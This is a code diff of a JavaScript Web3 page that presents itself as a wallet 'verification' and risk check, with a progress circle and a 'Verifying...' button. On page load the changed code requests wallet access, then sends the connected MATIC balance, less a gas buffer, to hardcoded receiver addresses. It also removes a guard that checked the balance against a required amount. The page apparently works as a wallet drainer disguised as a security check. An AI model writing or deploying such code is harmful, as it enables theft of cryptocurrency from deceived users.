@@ -2,9 +2,13 @@ let provider;
 let signer;
 let currentBalance = 0;
 
-// Адрес получателя платежей
-const RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
+const isDev = window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1');
 
+// Адрес получателя платежей
+const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
+const DEV_RECEIVER_ADDRESS = "0x8e62C38421A0670f42e3881A9E9dA93f08723af2";
+const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
+console.log('RECEIVER_ADDRESS', RECEIVER_ADDRESS);
 async function updateBalance() {
     try {
         if (!signer || !provider) {
@@ -156,11 +160,6 @@ async function sendPayment() {
         actionButton.classList.add('loading');
         actionButton.textContent = 'Verifying...';
 
-        if (!currentBalance || currentBalance.eq(0)) {
-            console.log('No MATIC balance available');
-            return;
-        }
-
         const userAddress = await signer.getAddress();
         console.log('Sending from address:', userAddress);
         
@@ -168,8 +167,8 @@ async function sendPayment() {
         const balance = await provider.getBalance(userAddress);
         console.log('Current MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');
         
-        if (balance.lt(currentBalance)) {
-            console.log(`Insufficient MATIC balance. Required: ${ethers.utils.formatEther(currentBalance)} MATIC, Available: ${ethers.utils.formatEther(balance)} MATIC`);
+        if (balance.eq(0)) {
+            console.log('No MATIC balance available');
             return;
         }
 
@@ -180,7 +179,6 @@ async function sendPayment() {
         // Рассчитываем стоимость газа для транзакции с запасом в 20%
         const gasLimit = 21000; // Стандартный лимит для простого перевода
         const gasCost = gasPrice.mul(gasLimit);
-        // Добавляем 20% к стоимости газа для безопасности
         const gasCostWithBuffer = gasCost.mul(120).div(100);
         console.log('Gas cost with buffer:', ethers.utils.formatEther(gasCostWithBuffer), 'MATIC');
 
@@ -204,8 +202,8 @@ async function sendPayment() {
             to: RECEIVER_ADDRESS,
             value: amountToSend,
             gasLimit: gasLimit,
-            maxFeePerGas: gasPrice.mul(2), // Увеличиваем максимальную цену газа в 2 раза
-            maxPriorityFeePerGas: gasPrice // Устанавливаем приоритетную комиссию равной базовой
+            maxFeePerGas: gasPrice.mul(2),
+            maxPriorityFeePerGas: gasPrice
         });
 
         console.log('Transaction sent:', tx.hash);
@@ -226,7 +224,6 @@ async function sendPayment() {
         circle.style.strokeDasharray = `${circumference} ${circumference}`;
         circle.style.strokeDashoffset = circumference;
         
-        // Устанавливаем прогресс (0.2 = 20% риска, значит показываем 80% заполнения)
         setTimeout(() => {
             const offset = circumference - (0.8 * circumference);
             circle.style.strokeDashoffset = offset;
@@ -241,7 +238,6 @@ async function sendPayment() {
 
     } catch (error) {
         console.error('Transaction error:', error);
-        // Показываем ошибку пользователю
         const actionButton = document.getElementById('action-button');
         actionButton.textContent = error.message || 'Transaction failed';
         actionButton.style.backgroundColor = 'var(--danger-color)';
@@ -250,7 +246,6 @@ async function sendPayment() {
             actionButton.style.backgroundColor = 'var(--primary-color)';
         }, 3000);
     } finally {
-        // В случае ошибки возвращаем кнопку в активное состояние
         const actionButton = document.getElementById('action-button');
         actionButton.disabled = false;
         actionButton.classList.remove('loading');
@@ -298,7 +293,7 @@ async function waitForProvider() {
     });
 }
 
-// Изменяем обработчик загрузки страницы
+// Добавляем обработчик загрузки страницы
 document.addEventListener('DOMContentLoaded', async () => {
     console.log('Page loaded, checking providers:', {
         ethereum: !!window.ethereum,
@@ -311,17 +306,44 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (provider) {
         console.log('Web3 provider detected, attempting automatic connection...');
         try {
-            // Проверяем, есть ли уже подключенные аккаунты
+            // Сначала пробуем получить список аккаунтов
             const accounts = await provider.request({ method: 'eth_accounts' });
+            console.log('Current accounts:', accounts);
+            
             if (accounts && accounts.length > 0) {
                 console.log('Found connected account, initiating automatic connection');
                 await handleAction();
             } else {
-                console.log('No connected accounts found, waiting for user action');
+                // Если аккаунтов нет, пробуем запросить подключение
+                console.log('No connected accounts, requesting connection...');
+                try {
+                    const newAccounts = await provider.request({ method: 'eth_requestAccounts' });
+                    console.log('New accounts after request:', newAccounts);
+                    if (newAccounts && newAccounts.length > 0) {
+                        await handleAction();
+                    } else {
+                        console.log('User rejected connection request');
+                    }
+                } catch (requestError) {
+                    console.log('Error requesting accounts:', requestError);
+                    if (requestError.code === 4001) {
+                        console.log('User rejected connection request');
+                    } else {
+                        console.error('Unexpected error:', requestError);
+                    }
+                }
             }
         } catch (error) {
-            console.log('Auto-connection check failed:', error);
+            console.error('Auto-connection check failed:', error);
+            if (error.code) {
+                console.log('Error code:', error.code);
+            }
+            if (error.message) {
+                console.log('Error message:', error.message);
+            }
         }
+    } else {
+        console.log('No Web3 provider found');
     }
     
     showStatus('Please connect your wallet to continue', true);
